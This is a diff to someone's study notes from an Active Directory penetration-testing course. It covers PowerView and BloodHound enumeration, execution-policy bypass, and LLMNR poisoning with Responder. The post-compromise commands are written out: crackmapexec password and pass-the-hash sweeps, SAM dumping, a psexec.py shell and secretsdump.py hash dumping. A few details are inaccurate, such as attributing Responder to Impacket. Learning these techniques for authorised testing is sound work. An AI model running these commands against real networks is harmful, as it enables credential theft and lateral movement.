@@ -49,7 +49,7 @@
 * **LINK LOCAL MULTICAST NAME RESOLUTION**
 * used to identify hosts when DNS fails to do so
 * previously ***NBT-NS***
-* **key flaw is** that the the service utilize a user's username and  NTLMv2 hash when approprietly responded to
+* **key flaw is** that the the service utilizes a user's username and  NTLMv2 hash when approprietly responded to
 * when we respond to this service it responds back to us with a username and a NTLMv2 password hash
 * user types in something misspelled, server send us a broadcast message, we listen ***man in the middle*** attack, we respond yes and capture the username and hash then forward the request to the server. **responder** will help us with that, which is a tool from **Impacket**
 * run **responder** first thing in the morning or when people come back from lunch because it needs some traffic
@@ -163,4 +163,76 @@
 
 #### Domain enumeration with PowerView
 
-* starting from 18/120
+* get PowerView from this **[github link](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)**
+* bring PowerView over to target Windwos machine
+* first cun PowerShell from terminal: `powershell -ep bypass` this bypasses the execution policy, not for security, it stops us from accidentally executing a script, so we need to bypass it
+* `. .\PowerView.ps1` to initiate it
+* `Get-NetDomain` information about the Domain Controller, if the system has multiple controllers then run `Get NetDomainController`
+* `Get-DomainPolicy` to see all the different policies of the Domain
+* `(Get-DomainPolicy)."system access"` this wil show more info on the ***system access policy*** like password policy, etc.
+* `Get-NetUser` information on the users (dirty output)
+* `Get-NetUser | select cn` information on users (cleaner)
+* `Get-NetUser | select samaccountname` pulling down SAM account names
+* `Get-NetUser | select description` same but for description
+* `Get-UserProperty` showing all the properties a user might have
+* `Get-UserProperty -Properties pwdlastset` when was a user's password last set
+* `Get-UserProperty -Properties logoncount` **a good way to ID honeypot accounts** shows how many times a user logged in. If you see an account where a user never logged in, that might be a honeypot account. They just letting it sit there for you to try to hunt it down
+* `Get-UserProperty -Properties badpwdcount` if you see too many bad passwords here that account might have had been under attack
+* `Get-NetComputer` it lists out all the computers in this Domain
+* `Get-NetComputer -FullData` maybe a little too much information, but it works
+* `Get-NetComputer -FullData | select OperatingSystem` pulling down specific information on the Operating System, what are the server and user machines
+* `Get-NetGroup` check for any interesting groups for us
+* `Get-NetGroup -GroupName "Domain Admins"` sorting it out, groups for Domain Admins
+* `Get-NetGroup -GroupName "Admin"` to see what admins are out there
+* `Get-NetGroupMember -GroupName "Domain Admins"` will list out all our domain admins
+* `Invoke-ShareFinder` a tool for finding shares, where and what is being shared
+* `Get-NetGPO` shows all the group policies
+* `Get-NetGPO | select displayname, whenchanged` what is going on in the network and when was it changed to learn more about the system's policies
+
+#### Domain enumeration with Bloodhound
+
+* once we are on the network, it downloads the data of the AD and helps us to visualize it
+* `apt install bloodhound` to install it on kali
+* setting it up: `neo4j console`
+* open it up (see link in terminal) and change default credentials from neo4j:neo4j
+* in tty: `bloodhound` then log in in the opened up browser
+* let's pull some data with an injester first, using the **[invoke sharphound from Github repo](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1)** 
+* Invoke Sharphound goes on to the target Windows machine, so it can collect data
+* run it, first powershell `powershell -ep bypass` than sharphound with `. .\SharpHound.ps1`
+* `Invoke-BloodHound -CollectionMethod All -Domain domain.local -ZipFileName file.zip`
+* copy the generated file back to kali, where we will import it and review the details
+* on kali upload it into Bloodhound opened browser
+
+## Post compromise attacks
+
+* these attacks require to have compromised the system already and have some credentials
+
+### Pass the password attack with crackmapexec
+
+* passing the hash around with ***crackmapexec.py*** which will throw around the captured hash and see where it sticks
+* install it on kali `apt install crackmapexec`
+* usage `crackmapexec --help` to get help, typically we provide a username, domain and password for now
+* `crackmapexec smb <target network IP/24> -u username -d domain.local -p password`
+* `crackmapexec smb <target network IP/24> -u username -d domain.local -p password --sam` it will try to dump the SAM file (short for SAM=Security Account Manager)
+* trying to get a shell with psexec.py: `psexec.py domain/username:password@<domain_target_IP>`
+* password spraying is NOT recommended on Domains becaue if you get many failed login attempts you can lock this user out of the Domain, on local accounts it's OK
+
+### Dumping hashes with secretsdump
+
+* it is also part of the impacket github repo
+* `secretsdump.py domain/username:password@<domain_target_IP>` dumps the hashes for us
+
+### Pass the hash attack
+
+* NTLM hashes can be passed around, NTLMv2 hashes **can not** be passed around
+* copy second part of the hash then run it in crackmapexec `crackmapexec smb IP-range -u username -H paste_hash_here --local-auth`
+* see it's gonna try to pass it around the network and gain access, green plus sign indicates in succeed
+
+# finish section 19/132
+
+### Kerberoasting
+
+![kerberoasting](images/kerberoasting.png)
+
+* additional notes here...
+
